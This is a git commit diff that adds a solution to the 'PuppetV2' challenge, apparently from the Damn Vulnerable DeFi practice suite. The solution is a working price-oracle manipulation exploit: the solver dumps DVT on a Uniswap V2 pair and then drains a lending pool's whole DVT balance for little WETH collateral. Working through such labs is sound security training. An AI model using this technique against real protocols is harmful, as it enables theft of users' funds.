6cd31c52d28d51db01da349b5ac99d8168fa225e
Ubaid Ch <ubaidullahchaudhry01@gmail.com>
2025-06-30 17:21:48 +0500

    PuppetV2 challenge Solved

--- test/puppet-v2/PuppetV2.t.sol
+++ test/puppet-v2/PuppetV2.t.sol
@@ -98,7 +98,24 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+                // Dump DVT for ETH
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 9 ether, path, player, block.timestamp);
+        // Note: Now DVT price significantly dropped since we swapped a lot of DVT for ETH and modified the reserves
+
+        // Convert the ETH we have to WETH
+        weth.deposit{value: player.balance}();
+
+        // Borrow all the DVT we can with minimum amount of WETH
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
+        weth.approve(address(lendingPool), depositOfWETHRequired);
+        lendingPool.borrow(poolBalance);
+        token.transfer(recovery, poolBalance);
+
     }
 
     /**
